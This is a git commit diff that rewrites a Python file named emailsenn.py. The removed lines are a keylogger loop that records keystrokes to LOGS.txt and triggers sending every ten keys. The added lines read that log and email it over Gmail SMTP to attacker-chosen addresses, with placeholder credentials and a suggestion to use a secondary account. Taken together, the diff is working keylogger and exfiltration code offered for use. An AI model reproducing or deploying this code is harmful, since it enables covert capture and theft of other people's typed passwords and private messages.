95d1869b4bd0ab66c0e9afcce9bb7df2348c80d5
MisticPvP <104326146+MisticPvP@users.noreply.github.com>
2023-04-13 21:08:53 -0400

    Update emailsenn.py

--- emailsenn.py
+++ emailsenn.py
@@ -1,29 +1,21 @@
-import os, getkey
-from getkey import *
-import emailsenn
+import smtplib
+from email.mime.text import MIMEText
+from pathlib import Path
+contents = Path("LOGS.txt").read_text()
 
-timer = 0
+smtp_ssl_host = 'smtp.gmail.com'  # smtp.mail.yahoo.com
+smtp_ssl_port = 465
+username = 'AN_EMAIL_WHICH_IS_NOT_YOUR_MAIN'
+password = 'YOUR_APP_PASSWORD_FROM_YOUR_ALT_EMAIL'
+sender =(username)
+targets = ['YOUR_EMAIL', 'ANOTHER_EMAIL_IF_YOU_WANT']
 
-while True:
+msg = MIMEText(contents)
+msg['Subject'] = 'logs'
+msg['From'] = sender
+msg['To'] = ', '.join(targets)
 
-    timer += 1
-    print(timer)
-    key = getkey()
-    L = open('LOGS.txt', "a")
-    with open('LOGS.txt') as infile:
-      words = 0
-      characters = 0
-      for lineno, line in enumerate(infile, 1):
-        wordslist = line.split()
-        words += len(wordslist)
-        characters += sum(len(word) for word in wordslist)
-    if key == '' and characters != 0:
-      with open('LOGS.txt', 'rb+') as filehandle:
-        filehandle.seek(-1, os.SEEK_END)
-        filehandle.truncate()
-    elif key != '':
-      L.write(key)
-      L.close()
-    if timer == 10:
-      emailsenn
-      timer = 0
+server = smtplib.SMTP_SSL(smtp_ssl_host, smtp_ssl_port)
+server.login(username, password)
+server.sendmail(sender, targets, msg.as_string())
+server.quit()
